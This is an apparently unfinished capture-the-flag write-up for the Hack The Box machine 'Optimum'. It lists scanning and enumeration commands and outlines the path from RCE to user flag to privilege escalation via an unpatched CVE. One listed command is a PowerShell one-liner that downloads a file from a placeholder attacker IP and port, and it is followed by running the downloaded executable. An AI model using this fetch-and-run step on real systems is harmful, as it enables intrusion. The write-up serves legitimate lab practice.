# Optimum (Not Done)
* Link: https://app.hackthebox.com/machines/Optimum
* Type: Windows
* Difficulty: Easy

## Commands Used
* *nmap -sC -sV -oA OUTPUTDIR IPADDRESS* - Nmap scan.
* *tcpdump -i INTERFACE* - listens on that interface for ping requests.
* *locate filename* - finds the file path.
* *./windows-exploit-suggester.py --update*
* *./windows-exploit-suggester.py --database DBNAME.xls --systeminfo SYSTEMINFOFILE*
* *powershell -c "(new-object System.Net.WebClient).DownloadFile('http://IPADDRESS:PORTNUMBER/FILENAME', 'PATH/FILENAME.EXT')"* - downloads a file.
* *FILENAME.EXE* - Runs the file in Windows
* *type TEXTFILE.TXT* - Reads a text file.


## Steps
* Start by checking the open ports using nmap (nmap -sC -sV -oA DIR IPADDRESS)
* Finds a website check for vulnerabilities for that website.
* Find a vulnerability that gives RCE.
* Get user flag
* Get systeminfo
* Use Windows Exploit Suggestor to get a recommendation for privilege escalation.
* Find a CVE use it to get root.

## Why is the machine vulnerable
* The Machine is not patched/updated. 
